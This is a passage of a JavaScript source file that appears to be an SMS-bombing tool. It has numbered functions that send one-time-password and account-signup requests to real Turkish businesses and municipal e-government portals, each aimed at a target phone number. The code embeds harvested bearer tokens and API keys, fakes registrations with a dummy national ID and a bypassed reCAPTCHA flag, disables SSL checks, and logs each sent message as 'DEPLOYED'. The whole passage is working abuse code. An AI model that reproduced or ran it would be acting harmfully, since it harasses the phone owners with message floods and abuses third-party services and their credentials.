            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) + chalk.red("💥 [MISS]") + chalk.cyan(" [Yapp] ") + chalk.white(`Target: +90${no} `) + chalk.red("❌ FAILED"));
        }
    });
}

// 23. YilmazTicaret
async function YilmazTicaret(no) {
    if (dataSb.success >= dataSb.amount) return systemFinished();
    dataSb.total++;
    const boundary = "q9dvlvKdAlrYErhMAn0nqaS09bnzem0qvDgMz_DPLA0BQZ7RZFgS9q.BuuuYRH7_DlX9dl";
    const p1 = no.slice(0, 3), p2 = no.slice(3, 6), p3 = no.slice(6, 8), p4 = no.slice(8);
    const data = `--${boundary}\r\ncontent-disposition: form-data; name="fonksiyon"\r\n\r\ncustomer/form/checkx\r\n--${boundary}\r\ncontent-disposition: form-data; name="method"\r\n\r\nPOST\r\n--${boundary}\r\ncontent-disposition: form-data; name="telephone"\r\n\r\n0 (${p1}) ${p2} ${p3} ${p4}\r\n--${boundary}\r\ncontent-disposition: form-data; name="token"\r\n\r\nd7841d399a16d0060d3b8a76bf70542e\r\n--${boundary}--\r\n`;
    request.post({
        url: "https://app.buyursungelsin.com:443/api/customer/form/checkx",
        headers: {
            "Accept": "*/*", "Content-Type": `multipart/form-data; boundary=${boundary}`,
            "Authorization": "Basic Z2Vsc2luYXBwOjR1N3ghQSVEKkctS2FOZFJnVWtYcDJzNXY4eS9CP0UoSCtNYlFlU2hWbVlxM3Q2dzl6JEMmRilKQE5jUmZValduWnI0dTd4IUElRCpHLUthUGRTZ1ZrWXAyczV2OHkvQj9FKEgrTWJRZVRoV21acTR0Nnc5eiRDJkYpSkBOY1Jm",
            "User-Agent": "Ylmaz/38 CFNetwork/1335.0.3.4 Darwin/21.6.0"
        },
        body: data,
        timeout: 6000
    }, function (err, httpResponse, body) {
        if (httpResponse?.statusCode == 200) {
            dataSb.success++;
            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) + chalk.green("🚀 [HIT]") + chalk.cyan(" [YilmazTicaret] ") + chalk.white(`Target: +90${no} `) + chalk.green("✅ DEPLOYED"));
        } else {
            dataSb.error++;
            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) + chalk.red("💥 [MISS]") + chalk.cyan(" [YilmazTicaret] ") + chalk.white(`Target: +90${no} `) + chalk.red("❌ FAILED"));
        }
    });
}

// 24. Beefull
async function Beefull(no, mail = faker.internet.email()) {
    if (dataSb.success >= dataSb.amount) return systemFinished();
    dataSb.total++;
    request.post({
        url: "https://app.beefull.io:443/api/inavitas-access-management/signup",
        json: {
            "email": mail, "firstName": "Memati", "language": "tr", "lastName": "Bas",
            "password": "123456", "phoneCode": "90", "phoneNumber": no,
            "tenant": "beefull", "username": mail
        },
        timeout: 4000
    }, function (err, httpResponse, body) {
        request.post({
            url: "https://app.beefull.io:443/api/inavitas-access-management/sms-login",
            json: { "phoneCode": "90", "phoneNumber": no, "tenant": "beefull" },
            timeout: 4000
        }, function (err2, httpResponse2, body2) {
            if (httpResponse2?.statusCode == 200) {
                dataSb.success++;
                console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) + chalk.green("🚀 [HIT]") + chalk.cyan(" [Beefull] ") + chalk.white(`Target: +90${no} `) + chalk.green("✅ DEPLOYED"));
            } else {
                dataSb.error++;
                console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) + chalk.red("💥 [MISS]") + chalk.cyan(" [Beefull] ") + chalk.white(`Target: +90${no} `) + chalk.red("❌ FAILED"));
            }
        });
    });
}

// 25. Dominos
async function Dominos(no, mail = faker.internet.email()) {
    if (dataSb.success >= dataSb.amount) return systemFinished();
    dataSb.total++;
    request.post({
        url: "https://frontend.dominos.com.tr:443/api/customer/sendOtpCode",
        headers: {
            "Content-Type": "application/json;charset=utf-8", "Accept": "application/json, text/plain, */*",
            "Authorization": "Bearer eyJhbGciOiJBMTI4S1ciLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwidHlwIjoiSldUIn0.ITty2sZk16QOidAMYg4eRqmlBxdJhBhueRLSGgSvcN3wj4IYX11FBA.N3uXdJFQ8IAFTnxGKOotRA.7yf_jrCVfl-MDGJjxjo3M8SxVkatvrPnTBsXC5SBe30x8edSBpn1oQ5cQeHnu7p0ccgUBbfcKlYGVgeOU3sLDxj1yVLE_e2bKGyCGKoIv-1VWKRhOOpT_2NJ-BtqJVVoVnoQsN95B6OLTtJBlqYAFvnq6NiQCpZ4o1OGNhep1TNSHnlUU6CdIIKWwaHIkHl8AL1scgRHF88xiforpBVSAmVVSAUoIv8PLWmp3OWMLrl5jGln0MPAlST0OP9Q964ocXYRfAvMhEwstDTQB64cVuvVgC1D52h48eihVhqNArU6-LGK6VNriCmofXpoDRPbctYs7V4MQdldENTrmVcMVUQtZJD-5Ev1PmcYr858ClLTA7YdJ1C6okphuDasvDufxmXSeUqA50-nghH4M8ofAi6HJlpK_P0x_upqAJ6nvZG2xjmJt4Pz_J5Kx_tZu6eLoUKzZPU3k2kJ4KsqaKRfT4ATTEH0k15OtOVH7po8lNwUVuEFNnEhpaiibBckipJodTMO8AwC4eZkuhjeffmf9A.QLpMS6EUu7YQPZm1xvjuXg",
            "Device-Info": "Unique-Info: 2BF5C76D-0759-4763-C337-716E8B72D07B Model: iPhone 31 Plus Brand-Info: Apple Build-Number: 7.1.0 SystemVersion: 15.8",
            "Appversion": "IOS-7.1.0", "User-Agent": "Dominos/7.1.0 CFNetwork/1335.0.3.4 Darwin/21.6.0",
            "Servicetype": "CarryOut", "Locationcode": "undefined"
        },
        json: { "email": mail, "isSure": false, "mobilePhone": no },
        timeout: 6000
    }, function (err, httpResponse, body) {
        try {
            const res = JSON.parse(body);
            if (res.isSuccess === true) {
                dataSb.success++;
                console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) + chalk.green("🚀 [HIT]") + chalk.cyan(" [Dominos] ") + chalk.white(`Target: +90${no} `) + chalk.green("✅ DEPLOYED"));
            } else { throw new Error("Failed"); }
        } catch (e) {
            dataSb.error++;
            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) + chalk.red("💥 [MISS]") + chalk.cyan(" [Dominos] ") + chalk.white(`Target: +90${no} `) + chalk.red("❌ FAILED"));
        }
    });
}

// 26. Baydoner
async function Baydoner(no, mail = faker.internet.email()) {
    if (dataSb.success >= dataSb.amount) return systemFinished();
    dataSb.total++;
    request.post({
        url: "https://crmmobil.baydoner.com:7004/Api/Customers/AddCustomerTemp",
        headers: {
            "Content-Type": "application/json", "Accept": "*/*", "Xsid": "2HB7FQ6G42QL",
            "Dc": "EC7E9665-CC40-4EF6-8C06-E0ADF31768B3", "Os": "613A408535",
            "Merchantid": "5701", "Platform": "1", "Appv": "1.6.0",
            "User-Agent": "BaydonerCossla/190 CFNetwork/1335.0.3.4 Darwin/21.6.0"
        },
        json: {
            "AppVersion": "1.6.0", "AreaCode": 90, "City": "ADANA", "CityId": 1, "Code": "",
            "Culture": "tr-TR", "DeviceId": "EC7E9665-CC40-4EF6-8C06-E0ADF31768B3", "DeviceModel": "31",
            "DeviceToken": "EC7E9665-CC40-4EF6-8C06-E0ADF31768B3", "Email": mail, "GDPRPolicy": false,
            "Gender": "Kad1n", "GenderId": 2, "LoyaltyProgram": false, "merchantID": 5701,
            "Method": "", "Name": "Memati", "notificationCode": "fBuxKYxj3k-qqVUcsvkjH1:APA91bFjtXD6rqV6FL2NzdSqQsn3OyKXiJ8YhzuzxirnF9K5sim_4sGYta11T1Iw3JaUrMTbj6KplF0NFp8upxoqa_7UaI1BSrNlVm9COXaldyxDTwLUJ5g",
            "NotificationToken": "fBuxKYxj3k-qqVUcsvkjH1:APA91bFjtXD6rqV6FL2NzdSqQsn3OyKXiJ8YhzuzxirnF9K5sim_4sGYta11T1Iw3JaUrMTbj6KplF0NFp8upxoqa_7UaI1BSrNlVm9COXaldyxDTwLUJ5g",
            "OsSystem": "IOS", "Password": "31ABC..abc31", "PhoneNumber": no, "Platform": 1,
            "sessionID": "", "socialId": "", "SocialMethod": "", "Surname": "Bas",
            "TempId": 0, "TermsAndConditions": false
        },
        timeout: 6000
    }, function (err, httpResponse, body) {
        try {
            const res = JSON.parse(body);
            if (res.Control === 1) {
                dataSb.success++;
                console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) + chalk.green("🚀 [HIT]") + chalk.cyan(" [Baydoner] ") + chalk.white(`Target: +90${no} `) + chalk.green("✅ DEPLOYED"));
            } else { throw new Error("Failed"); }
        } catch (e) {
            dataSb.error++;
            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) + chalk.red("💥 [MISS]") + chalk.cyan(" [Baydoner] ") + chalk.white(`Target: +90${no} `) + chalk.red("❌ FAILED"));
        }
    });
}

// 27. Pidem
async function Pidem(no) {
    if (dataSb.success >= dataSb.amount) return systemFinished();
    dataSb.total++;
    request.post({
        url: "https://restashop.azurewebsites.net:443/graphql/",
        headers: {
            "Accept": "*/*", "Origin": "https://pidem.azurewebsites.net",
            "Content-Type": "application/json", "Authorization": "Bearer null",
            "Referer": "https://pidem.azurewebsites.net/",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko)"
        },
        json: {
            "query": "\n  mutation ($phone: String) {\n    sendOtpSms(phone: $phone) {\n      resultStatus\n      message\n    }\n  }\n",
            "variables": { "phone": no }
        },
        timeout: 6000
    }, function (err, httpResponse, body) {
        try {
            const res = JSON.parse(body);
            if (res.data && res.data.sendOtpSms && res.data.sendOtpSms.resultStatus === "SUCCESS") {
                dataSb.success++;
                console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) + chalk.green("🚀 [HIT]") + chalk.cyan(" [Pidem] ") + chalk.white(`Target: +90${no} `) + chalk.green("✅ DEPLOYED"));
            } else { throw new Error("Failed"); }
        } catch (e) {
            dataSb.error++;
            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) + chalk.red("💥 [MISS]") + chalk.cyan(" [Pidem] ") + chalk.white(`Target: +90${no} `) + chalk.red("❌ FAILED"));
        }
    });
}

// 28. Frink
async function Frink(no) {
    if (dataSb.success >= dataSb.amount) return systemFinished();
    dataSb.total++;
    request.post({
        url: "https://api.frink.com.tr:443/api/auth/postSendOTP",
        headers: {
            "Accept": "*/*", "Content-Type": "application/json", "Authorization": "",
            "User-Agent": "Frink/1.6.0 (com.frink.userapp; build:3; iOS 15.8.3) Alamofire/4.9.1"
        },
        json: { "areaCode": "90", "etkContract": true, "language": "TR", "phoneNumber": "90" + no },
        timeout: 6000
    }, function (err, httpResponse, body) {
        try {
            const res = JSON.parse(body);
            if (res.processStatus === "SUCCESS") {
                dataSb.success++;
                console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) + chalk.green("🚀 [HIT]") + chalk.cyan(" [Frink] ") + chalk.white(`Target: +90${no} `) + chalk.green("✅ DEPLOYED"));
            } else { throw new Error("Failed"); }
        } catch (e) {
            dataSb.error++;
            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) + chalk.red("💥 [MISS]") + chalk.cyan(" [Frink] ") + chalk.white(`Target: +90${no} `) + chalk.red("❌ FAILED"));
        }
    });
}

// 29. Bodrum
async function Bodrum(no) {
    if (dataSb.success >= dataSb.amount) return systemFinished();
    dataSb.total++;
    request.post({
        url: "https://gandalf.orwi.app:443/api/user/requestOtp",
        headers: {
            "Content-Type": "application/json", "Accept": "application/json",
            "Apikey": "Ym9kdW0tYmVsLTMyNDgyxLFmajMyNDk4dDNnNGg5xLE4NDNoZ3bEsXV1OiE",
            "Origin": "capacitor://localhost", "Region": "EN",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_8_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"
        },
        json: { "gsm": "+90" + no, "source": "orwi" },
        timeout: 6000
    }, function (err, httpResponse, body) {
        if (httpResponse?.statusCode == 200) {
            dataSb.success++;
            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) + chalk.green("🚀 [HIT]") + chalk.cyan(" [Bodrum] ") + chalk.white(`Target: +90${no} `) + chalk.green("✅ DEPLOYED"));
        } else {
            dataSb.error++;
            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) + chalk.red("💥 [MISS]") + chalk.cyan(" [Bodrum] ") + chalk.white(`Target: +90${no} `) + chalk.red("❌ FAILED"));
        }
    });
}

// 30. KofteciYusuf
async function KofteciYusuf(no) {
    if (dataSb.success >= dataSb.amount) return systemFinished();
    dataSb.total++;
    request.post({
        url: "https://gateway.poskofteciyusuf.com:1283/auth/auth/smskodugonder",
        headers: {
            "Content-Type": "application/json; charset=utf-8", "Anonymousclientid": "",
            "Accept": "application/json", "Ostype": "iOS", "Appversion": "4.0.4.0",
            "Firmaid": "82", "Language": "tr-TR",
            "User-Agent": "YemekPosMobil/53 CFNetwork/1335.0.3.4 Darwin/21.6.0",
            "X-Guatamala-Kirsallari": "@@b7c5EAAAACwZI8p8fLJ8p6nOq9kTLL+0GQ1wCB4VzTQSq0sekKeEdAoQGZZo+7fQw+IYp38V0I/4JUhQQvrq1NPw4mHZm68xgkb/rmJ3y67lFK/uc+uq"
        },
        json: { "FireBaseCihazKey": null, "FirmaId": 82, "GuvenlikKodu": null, "Telefon": no },
        timeout: 6000
    }, function (err, httpResponse, body) {
        try {
            const res = JSON.parse(body);
            if (res.Success === true) {
                dataSb.success++;
                console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) + chalk.green("🚀 [HIT]") + chalk.cyan(" [KofteciYusuf] ") + chalk.white(`Target: +90${no} `) + chalk.green("✅ DEPLOYED"));
            } else { throw new Error("Failed"); }
        } catch (e) {
            dataSb.error++;
            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) + chalk.red("💥 [MISS]") + chalk.cyan(" [KofteciYusuf] ") + chalk.white(`Target: +90${no} `) + chalk.red("❌ FAILED"));
        }
    });
}

// 31. Little
async function Little(no, mail = faker.internet.email()) {
    if (dataSb.success >= dataSb.amount) return systemFinished();
    dataSb.total++;
    request.post({
        url: "https://api.littlecaesars.com.tr:443/api/web/Member/Register",
        headers: {
            "Accept": "application/json, text/plain, */*", "Content-Type": "application/json; charset=utf-8",
            "Authorization": "Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6IjM1Zjc4YTFhNjJjNmViODJlNjQ4OTU0M2RmMWQ3MDFhIiwidHlwIjoiSldUIn0.eyJuYmYiOjE3MzkxMTA0NzIsImV4cCI6MTczOTcxNTI3MiwiaXNzIjoiaHR0cHM6Ly9hdXRoLmxpdHRsZWNhZXNhcnMuY29tLnRyIiwiYXVkIjpbImh0dHBzOi8vYXV0aC5saXR0bGVjYWVzYXJzLmNvbS50ci9yZXNvdXJjZXMiLCJsaXR0bGVjYWVzYXJzYXBpIl0sImNsaWVudF9pZCI6IndlYiIsInN1YiI6InJvYnVzZXJAY2xvY2t3b3JrLmNvbS50ciIsImF1dGhfdGltZSI6MTczOTExMDQ3MiwiaWRwIjoibG9jYWwiLCJlbWFpbCI6InJvYnVzZXJAY2xvY2t3b3JrLmNvbS50ciIsInVpZCI6IjI0IiwicGVyc29uaWQiOiIyMDAwNTA4NTU0NjYiLCJuYW1lc3VybmFtZSI6IkxDIER1bW15IiwibGN0b2tlbiI6IlFRcHZHRS1wVDBrZDQ2MjRVQjhUc01SRkxoUUZsUlhGS0toTWYwUlF3U0M4Tnd3M2pzdHd6QzJ3NmNldGRkMkZRdFo1eXpacHVGOE81REhwUWpCSnhKaG5YNVJOcWYyc3NrNHhkTi0zcjZ2T01fdWQzSW5KRDZYUFdSYlM3Tml5d1FHbjByUENxNC1BVE9pd09iR005YnZwUTRISzJhNTFGVTdfQ1R2a2JGUmswMUpwM01YbkJmU3V6OHZ4bTdUTS1Vc1pXZzJDTmVkajlWaXJzdHo2TUs4VXdRTXp6TFZkZHRTQ2lOOENZVWc1cVhBNjVJbEszamVLNnZwQ0EwZTdpem5wa2hKUFVqY1dBc1JLc0tieDB3Y2EycU1EYkl6VlJXdV8xSjF5SDNhWmxSV0w4eFhJYl82NG5jd1p1Yk9MeFpiUFRRZW5GWWxuOGxNY1JFUDFIdTlCOWJyOFd3QVNqMmRDa3g2NVo5S0NPR3FiIiwibGNyZWZyZXNodG9rZW4iOiI2NDUyYWQ4MzIzY2I0N2ZiOWFmMWM2M2EyYWIxMTJkMyIsInBlcnNvbmVtYWlsIjoibGNAZHVtbXkuY29tIiwic2NvcGUiOlsibGl0dGxlY2Flc2Fyc2FwaSIsIm9mZmxpbmVfYWNjZXNzIl0sImFtciI6WyI3NjU2QkFGM0YxNUE2NTA0QkJGM0NFRTgyOTA5MkRGQSJdfQ.SrG2kFdRTVAq0SCt17cmZ-i6Cl9MaQaOUwu1YQ2r27m5_9i5WkVUx_CUPbCNazHcmGt3IYHw9U6TxS-zAz4Jw5o-PbCWktwBiLJNfIsK4akCT4RjX8b7d4YX0yDz4WcIp43ViEsEkDKByHwz75GWdV9gSJtmAerGjZbIoN-OkgJIYAxzCCeGUSdOW2jspvZew9VQKEKVRYzdfZlcvoCV_2mYV122P0jU5i_0J4k_JH-ok7bMxNGqpaxEDSZ1WEuQxBRcXr7C7swcj4AJHHDuksvNrHjXnSjB0VQt5sB3JuwjGDJRuY2yFUlrI8l8W4x01Jm6kSn67G4h8hqyNixpRg",
            "X-Platform": "ios", "X-Version": "1.0.0",
            "User-Agent": "LittleCaesars/20 CFNetwork/1335.0.3.4 Darwin/21.6.0"
        },
        json: {
            "CampaignInform": true, "Email": mail, "InfoRegister": true,
            "IsLoyaltyApproved": true, "NameSurname": "Memati Bas",
            "Password": "31ABC..abc31", "Phone": no, "SmsInform": true
        },
        timeout: 6000
    }, function (err, httpResponse, body) {
        try {
            const res = JSON.parse(body);
            if (httpResponse?.statusCode == 200 && res.status === true) {
                dataSb.success++;
                console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) + chalk.green("🚀 [HIT]") + chalk.cyan(" [Little] ") + chalk.white(`Target: +90${no} `) + chalk.green("✅ DEPLOYED"));
            } else { throw new Error("Failed"); }
        } catch (e) {
            dataSb.error++;
            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) + chalk.red("💥 [MISS]") + chalk.cyan(" [Little] ") + chalk.white(`Target: +90${no} `) + chalk.red("❌ FAILED"));
        }
    });
}

// 32. Orwi
async function Orwi(no) {
    if (dataSb.success >= dataSb.amount) return systemFinished();
    dataSb.total++;
    request.post({
        url: "https://gandalf.orwi.app:443/api/user/requestOtp",
        headers: {
            "Content-Type": "application/json", "Accept": "application/json",
            "Apikey": "YWxpLTEyMzQ1MTEyNDU2NTQzMg", "Origin": "capacitor://localhost", "Region": "EN",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_8_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"
        },
        json: { "gsm": "+90" + no, "source": "orwi" },
        timeout: 6000
    }, function (err, httpResponse, body) {
        if (httpResponse?.statusCode == 200) {
            dataSb.success++;
            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) + chalk.green("🚀 [HIT]") + chalk.cyan(" [Orwi] ") + chalk.white(`Target: +90${no} `) + chalk.green("✅ DEPLOYED"));
        } else {
            dataSb.error++;
            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) + chalk.red("💥 [MISS]") + chalk.cyan(" [Orwi] ") + chalk.white(`Target: +90${no} `) + chalk.red("❌ FAILED"));
        }
    });
}

// 33. Coffy
async function Coffy(no) {
    if (dataSb.success >= dataSb.amount) return systemFinished();
    dataSb.total++;
    request.post({
        url: "https://user-api-gw.coffy.com.tr:443/user/signup",
        headers: {
            "Accept": "application/json, text/plain, */*", "Content-Type": "application/json",
            "Language": "tr", "User-Agent": "coffy/5 CFNetwork/1335.0.3.4 Darwin/21.6.0",
            "Token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkIjoiNjdhOGM0MTc0MDY3ZDFmMzBkMDNmMmRlIiwidSI6IjY3YThjNDE3Njc5YTUxM2MyMzljMDc0YSIsInQiOjE3MzkxMTM0OTUyNjgsImlhdCI6MTczOTExMzQ5NX0.IQ_33PJ8s_CKMbJgp2sD1wIfFO852m5VfIxW-dv2-UA"
        },
        json: { "countryCode": "90", "gsm": no, "isKVKKAgreementApproved": true, "isUserAgreementApproved": true, "name": "Memati Bas" },
        timeout: 6000
    }, function (err, httpResponse, body) {
        if (httpResponse?.statusCode == 200) {
            dataSb.success++;
            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) + chalk.green("🚀 [HIT]") + chalk.cyan(" [Coffy] ") + chalk.white(`Target: +90${no} `) + chalk.green("✅ DEPLOYED"));
        } else {
            dataSb.error++;
            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) + chalk.red("💥 [MISS]") + chalk.cyan(" [Coffy] ") + chalk.white(`Target: +90${no} `) + chalk.red("❌ FAILED"));
        }
    });
}

// 34. Hamidiye
async function Hamidiye(no) {
    if (dataSb.success >= dataSb.amount) return systemFinished();
    dataSb.total++;
    request.post({
        url: "https://bayi.hamidiye.istanbul:3400/hamidiyeMobile/send-otp",
        headers: {
            "Accept": "application/json, text/plain, */*", "Content-Type": "application/json",
            "Origin": "com.hamidiyeapp", "User-Agent": "hamidiyeapp/4 CFNetwork/1335.0.3.4 Darwin/21.6.0"
        },
        json: { "isGuest": false, "phone": no },
        timeout: 6000
    }, function (err, httpResponse, body) {
        try {
            const res = JSON.parse(body);
            if (res.result === true) {
                dataSb.success++;
                console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) + chalk.green("🚀 [HIT]") + chalk.cyan(" [Hamidiye] ") + chalk.white(`Target: +90${no} `) + chalk.green("✅ DEPLOYED"));
            } else { throw new Error("Failed"); }
        } catch (e) {
            dataSb.error++;
            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) + chalk.red("💥 [MISS]") + chalk.cyan(" [Hamidiye] ") + chalk.white(`Target: +90${no} `) + chalk.red("❌ FAILED"));
        }
    });
}

// 35. Fatih
async function Fatih(no, mail = faker.internet.email(), tc = "11111111111") {
    if (dataSb.success >= dataSb.amount) return systemFinished();
    dataSb.total++;
    const boundary = "geckoformboundaryc5b24584149b44839fea163e885475be";
    const data = `------${boundary}\r\nContent-Disposition: form-data; name="__RequestVerificationToken"\r\n\r\nGKrki1TGUGJ0CBwKd4n5iRulER91aTo-44_PJdfM4_nxAK7aL1f0Ho9UuqG5lya_8RVBGD-j-tNjE93pZnW8RlRyrAEi6ry6uy8SEC20OPY1\r\n------${boundary}\r\nContent-Disposition: form-data; name="SahisUyelik.TCKimlikNo"\r\n\r\n${tc}\r\n------${boundary}\r\nContent-Disposition: form-data; name="SahisUyelik.DogumTarihi"\r\n\r\n28.12.1999\r\n------${boundary}\r\nContent-Disposition: form-data; name="SahisUyelik.Ad"\r\n\r\nMemati\r\n------${boundary}\r\nContent-Disposition: form-data; name="SahisUyelik.Soyad"\r\n\r\nBas\r\n------${boundary}\r\nContent-Disposition: form-data; name="SahisUyelik.CepTelefonu"\r\n\r\n${no}\r\n------${boundary}\r\nContent-Disposition: form-data; name="SahisUyelik.EPosta"\r\n\r\n${mail}\r\n------${boundary}\r\nContent-Disposition: form-data; name="SahisUyelik.Sifre"\r\n\r\nMemati31\r\n------${boundary}\r\nContent-Disposition: form-data; name="SahisUyelik.SifreyiDogrula"\r\n\r\nMemati31\r\n------${boundary}\r\nContent-Disposition: form-data; name="recaptchaValid"\r\n\r\ntrue\r\n------${boundary}--\r\n`;
    request.post({
        url: "https://ebelediye.fatih.bel.tr:443/Sicil/KisiUyelikKaydet",
        headers: {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Content-Type": `multipart/form-data; boundary=----${boundary}`,
            "Origin": "null", "Dnt": "1", "Sec-Gpc": "1", "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1", "Priority": "u=0, i", "Te": "trailers", "Connection": "keep-alive"
        },
        body: data,
        timeout: 6000,
        strictSSL: false
    }, function (err, httpResponse, body) {
        if (httpResponse?.statusCode == 200) {
            dataSb.success++;
            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) + chalk.green("🚀 [HIT]") + chalk.cyan(" [Fatih] ") + chalk.white(`Target: +90${no} `) + chalk.green("✅ DEPLOYED"));
        } else {
            dataSb.error++;
            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) + chalk.red("💥 [MISS]") + chalk.cyan(" [Fatih] ") + chalk.white(`Target: +90${no} `) + chalk.red("❌ FAILED"));
        }
    });
}

// 36. Sancaktepe
async function Sancaktepe(no, mail = faker.internet.email(), tc = "11111111111") {
    if (dataSb.success >= dataSb.amount) return systemFinished();
    dataSb.total++;
    const boundary = "geckoformboundary35479e29ca6a61a4a039e2d3ca87f112";
    const data = `------${boundary}\r\nContent-Disposition: form-data; name="__RequestVerificationToken"\r\n\r\n21z_svqlZXLTEPZGuSugh8winOg_nSRis6rOL-96TmwGUHExtulBBRN9F2XBS_LvU28OyUsfMVdZQmeJlejCYZ1slOmqI63OX_FsQhCxwGk1\r\n------${boundary}\r\nContent-Disposition: form-data; name="SahisUyelik.TCKimlikNo"\r\n\r\n${tc}\r\n------${boundary}\r\nContent-Disposition: form-data; name="SahisUyelik.DogumTarihi"\r\n\r\n13.01.2000\r\n------${boundary}\r\nContent-Disposition: form-data; name="SahisUyelik.Ad"\r\n\r\nMEMATİ\r\n------${boundary}\r\nContent-Disposition: form-data; name="SahisUyelik.Soyad"\r\n\r\nBAS\r\n------${boundary}\r\nContent-Disposition: form-data; name="SahisUyelik.CepTelefonu"\r\n\r\n${no}\r\n------${boundary}\r\nContent-Disposition: form-data; name="SahisUyelik.EPosta"\r\n\r\n${mail}\r\n------${boundary}\r\nContent-Disposition: form-data; name="SahisUyelik.Sifre"\r\n\r\nMemati31\r\n------${boundary}\r\nContent-Disposition: form-data; name="SahisUyelik.SifreyiDogrula"\r\n\r\nMemati31\r\n------${boundary}\r\nContent-Disposition: form-data; name="recaptchaValid"\r\n\r\ntrue\r\n------${boundary}--\r\n`;
    request.post({
        url: "https://e-belediye.sancaktepe.bel.tr:443/Sicil/KisiUyelikKaydet",
        headers: {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Content-Type": `multipart/form-data; boundary=----${boundary}`,
            "Origin": "null", "Dnt": "1", "Sec-Gpc": "1", "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1", "Priority": "u=0, i", "Te": "trailers", "Connection": "keep-alive"
        },
        body: data,
        timeout: 6000,
        strictSSL: false
    }, function (err, httpResponse, body) {
        if (httpResponse?.statusCode == 200) {
            dataSb.success++;
            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) + chalk.green("🚀 [HIT]") + chalk.cyan(" [Sancaktepe] ") + chalk.white(`Target: +90${no} `) + chalk.green("✅ DEPLOYED"));
        } else {
            dataSb.error++;
            console.log(chalk.gray(`[${dayjs().format("YYYY-MM-DD HH:mm:ss")}] `) + chalk.red("💥 [MISS]") + chalk.cyan(" [Sancaktepe] ") + chalk.white(`Target: +90${no} `) + chalk.red("❌ FAILED"));
        }
    });
}

// 37. Bayrampasa
async function Bayrampasa(no, mail = faker.internet.email(), tc = "11111111111") {
    if (dataSb.success >= dataSb.amount) return systemFinished();
    dataSb.total++;
    const boundary = "geckoformboundary8971e2968f245b21f5fd8c5e80bdfb8b";
    const data = `------${boundary}\r\nContent-Disposition: form-data; name="__RequestVerificationToken"\r\n\r\nzOIiDXRlsw-KfS3JGnn-Vxdl5UP-ZNzjaA207_Az-5FfpsusGnNUxonzDkvoZ55Cszn3beOwk80WczRsSfazSZVxqMU0mMkO70gOe8BlbSg1\r\n------${boundary}\r\nContent-Disposition: form-data; name="SahisUyelik.TCKimlikNo"\r\n\r\n${tc}\r\n------${boundary}\r\nContent-Disposition: form-data; name="SahisUyelik.DogumTarihi"\r\n\r\n07.06.2000\r\n------${boundary}\r\nContent-Disposition: form-data; name="SahisUyelik.Ad"\r\n\r\nMEMATİ\r\n------${boundary}\r\nContent-Disposition: form-data; name="SahisUyelik.Soyad"\r\n\r\nBAS\r\n------${boundary}\r\nContent-Disposition: form-data; name="SahisUyelik.CepTelefonu"\r\n\r\n${no}\r\n------${boundary}\r\nContent-Disposition: form-data; name="SahisUyelik.EPosta"\r\n\r\n${mail}\r\n------${boundary}\r\nContent-Disposition: form-data; 